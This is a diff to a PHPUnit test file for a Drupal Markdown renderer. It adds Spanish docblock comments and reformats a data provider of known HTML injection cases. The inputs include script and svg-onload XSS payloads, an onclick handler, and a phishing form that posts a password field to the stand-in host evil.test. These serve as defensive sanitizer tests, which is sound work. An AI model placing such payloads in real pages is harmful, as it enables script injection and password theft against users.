@@ -20,6 +20,11 @@ use PHPUnit\Framework\Attributes\DataProvider;
 #[CoversClass(MarkdownRenderer::class)]
 final class MarkdownRendererTest extends UnitTestCase {
 
+  /**
+   * Renderizador bajo prueba.
+   *
+   * @var \Drupal\sales_leadership_diagnostic\Service\Conversation\MarkdownRenderer
+   */
   private MarkdownRenderer $renderer;
 
   /**
@@ -81,6 +86,7 @@ final class MarkdownRendererTest extends UnitTestCase {
    * Casos de inyección conocidos.
    *
    * @return array<string, array{string, string}>
+   *   Cada caso, con su descripción y la entrada maliciosa.
    */
   public static function proveedorDeAtaques(): array {
     return [
@@ -92,7 +98,10 @@ final class MarkdownRendererTest extends UnitTestCase {
       'div con onclick' => ['div con onclick', '<div onclick="robar()">texto</div>'],
       'style con expresion' => ['style con expresion', '<style>body{display:none}</style>'],
       'svg con onload' => ['svg con onload', '<svg onload=alert(1)></svg>'],
-      'formulario de phishing' => ['formulario de phishing', '<form action="https://evil.test"><input name="pass"></form>'],
+      'formulario de phishing' => [
+        'formulario de phishing',
+        '<form action="https://evil.test"><input name="pass"></form>',
+      ],
       'markdown con html incrustado' => ['markdown con html incrustado', "**negrita** y <script>alert(1)</script>"],
     ];
   }
